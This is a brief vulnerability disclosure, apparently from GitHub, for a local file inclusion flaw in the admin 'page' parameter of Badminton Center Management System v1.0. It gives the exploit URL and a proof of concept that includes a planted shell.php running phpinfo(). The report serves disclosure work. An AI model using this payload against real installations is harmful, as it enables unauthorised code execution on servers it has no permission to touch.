# Badminton Center Management System v1.0 by oretnom23 has The local file contains

vendor: https://www.sourcecodester.com/php/15318/badminton-center-management-system-phpoop-free-source-code.html

Vulnerability File: ip/bcms/admin/?page=

Vulnerability location: ip/bcms/admin/?page=, page

Payload: ip/bcms/admin/?page=shell

![image](https://user-images.githubusercontent.com/54017627/170613342-c6ea33e6-bff9-4fcc-8157-35d9ae765975.png)

We create a shell.php under the PHP file of the root of the website, which reads "<? phpinfo ();? > "

![image](https://user-images.githubusercontent.com/54017627/170479151-b4aabc1a-fdbd-45d2-8f5a-248d37092584.png)

And visit http://ip/bcms/admin/?page=shell You can see that phpinfo has been successfully included

![image](https://user-images.githubusercontent.com/54017627/170613266-c448f20c-2bb8-4c18-9a45-436e15eb01d5.png)
